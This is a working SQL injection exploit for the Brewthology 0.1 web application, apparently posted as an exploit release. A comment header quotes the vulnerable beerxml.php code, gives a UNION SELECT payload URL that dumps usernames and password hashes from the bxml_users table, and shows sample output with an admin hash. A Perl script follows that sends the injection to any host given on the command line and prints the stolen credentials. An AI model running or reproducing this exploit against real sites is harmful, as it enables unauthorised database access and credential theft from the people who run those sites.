#Brewthology 0.1 SQL Injection Exploit
#By cr4wl3r http://bastardlabs.info
#Script: http://sourceforge.net/projects/brewthology/files/brewthology/v0.1%20public%20beta/
#Demo: http://bastardlabs.info/demo/brewthology.png
#Tested: Win 7
#
# Bugs found in beerxml.php
#
# if (isset($_GET['r'])) 
# 	{ 
# 	$recipenum = $_GET['r']; 
# 
# // Pull Data from DB	
#    $recipes = "SELECT * FROM bxml_recipes WHERE reciperecid=$recipenum"; 
#    $recresult = @mysql_query ($recipes); 
#  }
#
# http://bastardlabs/[path]/beerxml.php?r=[SQLi]
# Example: http://bastardlabs/[path]/beerxml.php?r=null%20union%20select%201,2,3,4,5,concat(username,0x3a,userpass),7,8,9,10,11%20from%20bxml_users
#
#
# $ perl brewthology.pl localhost /demo/
# [+] Please Wait ...
#
# [+] Getting Username and Password    [ ok ]
# [+] w00tw00t
# [+] Username | Password --> admin:ab4d8d2a5f480a137067da17100271cd176607a1

#!/usr/bin/perl

use IO::Socket;

$host = $ARGV[0];
$path = $ARGV[1];

if (@ARGV < 2) { 

print qq(
+---------------------------------------------+
|    Brewthology 0.1 SQL Injection Exploit    |
|                                             |
|            coded & exploited by cr4wl3r     |
|                 http://bastardlabs.info/    |
+---------------------------------------------+
                    -=[X]=-
   +---------------------------------------
    Usage :                                
                                           
    perl $0 <host> <path>                  
    ex : perl $0 127.0.0.1 /Brewthology/   
                                           
   +---------------------------------------
);
}

$target = "http://".$host.$path."/beerxml.php?r=null%20union%20select%201,2,3,4,5,concat(username,0x3a,userpass),7,8,9,10,11%20from%20bxml_users";
$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", 
PeerPort=>"80") || die "[-] Can't connect to Server   [ failed ]\n";
print "[+] Please Wait ...\n";
print $sock "GET $target HTTP/1.1\n";
print $sock "Accept: */*\n";
print $sock "User-Agent: BastardLabs\n";
print $sock "Host: $host\n";
print $sock "Connection: close\n\n";
sleep 2;
while ($answer = <$sock>) {
if ($answer =~ /<USE>(.*?)<\/USE>/) {
print "\n[+] Getting Username and Password    [ ok ]\n";
sleep 1;
print "[+] w00tw00t\n";
print "[+] Username | Password --> $1\n";
exit();
}
}
print "[-] Exploit Failed !\n";
